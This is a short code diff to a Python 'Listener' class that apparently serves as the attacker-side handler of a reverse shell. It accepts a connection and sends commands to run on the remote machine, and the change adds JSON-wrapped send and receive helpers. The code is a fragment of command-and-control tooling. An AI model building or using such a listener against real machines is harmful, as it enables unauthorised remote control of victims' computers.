@@ -1,4 +1,4 @@
-import socket
+import socket, json
 
 class Listener:
   def __init__(self, ip, port):
@@ -9,10 +9,18 @@ class Listener:
     print("[+] Waiting for incoming connections")
     self.connection, address = listener.accept()
     print("[+] Got a connection from " +str(address))
+  
+  def reliable_send(self, data):
+    json_data = json.dumps(data)
+    self.connection.send(json_data)
+
+  def reliable_receive(self):
+    json_data = self.connection.recv(1024)
+    return json.loads(json_data)
 
   def execute_remotely(self, command):
-    self.connection.send(command)
-    return self.connection.recv(1024)
+    self.reliable_send(command)
+    return self.reliable_receive()
     
   def run(self):
     while True:
